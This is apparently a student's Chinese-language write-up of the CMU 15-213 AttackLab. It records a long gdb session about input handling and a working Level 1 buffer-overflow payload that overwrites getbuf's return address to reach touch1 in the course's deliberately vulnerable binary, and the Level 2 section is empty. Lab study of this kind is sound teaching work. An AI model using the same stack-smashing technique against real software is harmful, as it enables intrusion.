## AttackLab

与BombLab类似，先看writeup，再看readme，最后看target中的readme
共计三个可执行文件 `hex2raw`，`ctarget`，`rtarget`。

writeup中先看`ctarget`文件。

在本地运行
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```

error input1 // input sufficiently  short
![err1](https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png)

error input2 // input too long
![err2](https://s2.loli.net/2025/08/14/957KduTJO8chMiG.png)

correctly input
![correct](https://s2.loli.net/2025/08/14/INaRLVKm9ny5JPZ.png)

c/rtarget都是这样使用，其中
farm.c：目标“小工具农场”的源代码，您将使用它来生成面向返回的编程攻击。
cookie.txt：一个 8 位十六进制代码，您将用作攻击中的唯一标识符。
rtarget：易受面向返回编程攻击的可执行程序（ROP attack）
ctarget：易受代码注入攻击的可执行程序 (CI attack)
README.txt：描述目录内容的文件
hex2raw：生成攻击字符串的实用程序。

**漏洞利用字符串时不得在中间的任何位置包含0x0a**，因为这是'\n'的ASCII值。gets()函数将默认认为打算终止字符串。

随后给出了两个可执行文件对应的level tasks summary
![level summary](https://s2.loli.net/2025/08/14/LlFYaAOmRZfjVIW.png)

本地使用，也就是自学时，使用`-q`参数跳过服务器过程

由于Attack Lab存在诸多国内正常CS课程不会教授的内容，因此，这里补充CourseNotes，若已经学过这一部分，请跳转至[记录](#记录)

## CourseNotes

[course-note 05-09-machine](../course-note/05-09-machine.md)

## 记录

首先`objdump -d <file-name>` dump出`ctarget`,`rtarget`的disassembly code [ctarget.d](../../../src/Attack-Lab/ctarget.d),[rtarget.d](../../../src/Attack-Lab/rtarget.d)。

### Level 1

任务并不需要注入新的代码，而是重定向程序区执行现存的过程

> Function getbuf is called within CTARGET by a function test having the following C code:
>
> ![test](https://s2.loli.net/2025/08/17/IcBte3RCQnFSND1.png)
> When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:
> ![touch1](https://s2.loli.net/2025/08/17/JGKwRTcDE2Hn8fZ.png)
> Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

简单的用中文说，就是将getbuf的ret改成执行touch1

我们先尝试执行一遍ctarget
向ctarget.l1.txt填入以下内容
```txt
ef be ad de
```

然后执行命令
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./hex2raw < ctarget.l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```
肯定是失败的，然后gdb看一下test函数

然后设计一下如何使用cgdb调试
基本上通过2种方式

1. 通过 run

```shell
(gdb) run -q < <(./hex2raw < ctarget.l1.txt)
```

> 这里用到的`<()`会将输出变为一个临时文件
> 
> 相当于下面这个方式创建的中间文件

2. 通过中间文件
```shell
./hex2raw < ctarget.l1.txt > payload.raw
(gdb) set args -q
(gdb) run < payload.raw
```

这里我们就采用第一种方式

***这里遇到了两个小问题，通过gdb搞清楚了背后的原因，有一些小知识点，有关输入流和linux临时文件***，如果你没有遇到该问题，可以跳转[gdb解决了该问题后](#gdb解决了该问题后)

先不打断点运行看是否正常

```shell
(gdb) run -q < <(./hex2raw < ctarget.l1.txt)
Starting program: /home/ubuntu/learnning_project/CMU-15213/src/Attack-Lab/ctarget -q < <(./hex2raw < ctarget.l1.txt)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
1244    ./stdio-common/vfprintf-internal.c: No such file or directory.
```

我们直接`c`

```shell
(gdb) c
Continuing.
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
[Inferior 1 (process 1553765) exited with code 01]
```

再尝试b test,然后运行，发现还是一样。
我们看一下cgdb爆出一堆奇怪东西的bt
```shell
(gdb) bt
#0  0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:",
    ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
#1  0x00007ffff7ebec4b in ___printf_chk (flag=flag@entry=1, format=format@entry=0x4032b4 "Type string:") at ./debug/printf_chk.c:33
#2  0x0000000000401f10 in printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
#3  launch (offset=<optimized out>) at support.c:293
#4  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
```
可见在stable_launch就挂在奇怪的地方了

加两个断点`main`和`stable_launch`
一步步调试，发现根本没有进入test函数，猜测输入有问题，于是可以尝试

```shell
./hex2raw c< target.l1.txt
```

发现没有输入，这里记得最后输入一个回车：）

但是仍然没有作用，尝试分析一下dump文件，可见test启动于launch函数，而launch函数被stable_launch调用，程序应该是在launch调用test前就已经segment fault导致触发了一系列的输出。

```shell
 1│ Dump of assembler code for function launch:
 2│ support.c:
 3│ 285     in support.c
 4│    0x0000000000401eb4 <+0>:     push   %rbp
 5│    0x0000000000401eb5 <+1>:     mov    %rsp,%rbp
 6│    0x0000000000401eb8 <+4>:     sub    $0x10,%rsp
 7│    0x0000000000401ebc <+8>:     mov    %rdi,%rdx
 8│    0x0000000000401ebf <+11>:    mov    %fs:0x28,%rax
 9│    0x0000000000401ec8 <+20>:    mov    %rax,-0x8(%rbp)
10│    0x0000000000401ecc <+24>:    xor    %eax,%eax
11│
12│ 286     in support.c
13│    0x0000000000401ece <+26>:    lea    0x1e(%rdi),%rax
14│    0x0000000000401ed2 <+30>:    and    $0xfffffffffffffff0,%rax
15│    0x0000000000401ed6 <+34>:    sub    %rax,%rsp
16│    0x0000000000401ed9 <+37>:    lea    0xf(%rsp),%rdi
17│    0x0000000000401ede <+42>:    and    $0xfffffffffffffff0,%rdi
18│
19│ /usr/include/x86_64-linux-gnu/bits/string3.h:
20│    0x0000000000401ee2 <+46>:    mov    $0xf4,%esi
21│    0x0000000000401ee7 <+51>:    call   0x400d00 <memset@plt>
22│
23│ support.c:
24│    0x0000000000401eec <+56>:    mov    0x2025ad(%rip),%rax        # 0x6044a0 <stdin@@GLIBC_2.2.5>
25│    0x0000000000401ef3 <+63>:    cmp    %rax,0x2025d6(%rip)        # 0x6044d0 <infile>
26├──> 0x0000000000401efa <+70>:    jne    0x401f10 <launch+92>
```
最终在infile launch+70行发现了the root fault，继续`si`结果如下。

```shell
(gdb) si
printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
(gdb) bt
#0  printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
#1  launch (offset=<optimized out>) at support.c:293
#2  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
Backtrace stopped: Cannot access memory at address 0x55686000
```

```shell
# ifdef __va_arg_pack
102│ __fortify_function int
103│ fprintf (FILE *__restrict __stream, const char *__restrict __fmt, ...)
104│ {
105├─> return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
106│                         __va_arg_pack ());
107│ }
```

对这里`display $eflag`可知，这个cmp判断相等，随后就导致了错误

查询`ctarget.d`，可知执行过的launch函数如下
```shell
0000000000401eb4 <launch>:
  401eb4:	55                   	push   %rbp
  401eb5:	48 89 e5             	mov    %rsp,%rbp
  401eb8:	48 83 ec 10          	sub    $0x10,%rsp
  401ebc:	48 89 fa             	mov    %rdi,%rdx
  401ebf:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401ec6:	00 00 
  401ec8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401ecc:	31 c0                	xor    %eax,%eax
  401ece:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
  401ed2:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401ed6:	48 29 c4             	sub    %rax,%rsp
  401ed9:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
  401ede:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
  401ee2:	be f4 00 00 00       	mov    $0xf4,%esi
  401ee7:	e8 14 ee ff ff       	call   400d00 <memset@plt>
  401eec:	48 8b 05 ad 25 20 00 	mov    0x2025ad(%rip),%rax        # 6044a0 <stdin@GLIBC_2.2.5>
  401ef3:	48 39 05 d6 25 20 00 	cmp    %rax,0x2025d6(%rip)        # 6044d0 <infile>
  401efa:	75 14                	jne    401f10 <launch+0x5c>
```

考虑将gdb时的汇编丢给ai，问一下含义
```shell
23│ support.c:
24│    0x0000000000401eec <+56>:    mov    0x2025ad(%rip),%rax        # 0x6044a0 <stdin@@GLIBC_2.2.5>
25│    0x0000000000401ef3 <+63>:    cmp    %rax,0x2025d6(%rip)        # 0x6044d0 <infile>
26│    0x0000000000401efa <+70>:    jne    0x401f10 <launch+92>
```

简单理解，这里是一个SPJ（spacial judge），判断输入文件是否是输入流，是则做特殊执行。

我们通过以下命令查看两边的值以及输入流的值，发现确实是都是输入流的值，因此，这里可能直接触发了特殊判断然后进了segment fault，网上都没有提到这一点。

```shell
x/x $rip + 0x2025d6
p/x $rax
p/x stdin
```

随后，可以尝试通过查看我们问题的二次复现
```shell
./ctarget -q <(./hex2raw < ./ctarget.l1.txt)
```
发现这个和gdb一致，也会存在问题

###### gdb解决了该问题后

尝试一下调用，发现现在会调用test函数了，但是和`write-up`中写的仍有出入。

```shell
./ctarget -q -i <(./hex2raw < <(echo "00 00 00 00 00 ac"))
```

通过该命令即可解决无法成功运行的问题

总结一下解决方案，就是严格按照`write-up`中写的参数调用即可，包括输入流为文件的情况。

现在就可以开始正式的调试了。

这个比上面要简单,首先打个getbuf断点

```shell
 1│ Dump of assembler code for function getbuf:
 2│ buf.c:
 3│ 12      in buf.c
 4├──> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
```

可见开了一个40字节的栈帧。
然后我们直接查看touch1的地址即可

三种方式
```shell
(gdb) p touch1
$17 = {void ()} 0x4017c0 <touch1>
(gdb) info address touch1
Symbol "touch1" is a function at address 0x4017c0.
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch1
00000000004017c0 T touch1
```
然后遵循字节序，赋值一下 ctarget.l1.txt

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

这里有回车也没关系

```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l1.txt)
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level 2



## REF
1. https://csapp.cs.cmu.edu/3e/attacklab.pdf
2. https://zhuanlan.zhihu.com/p/476396465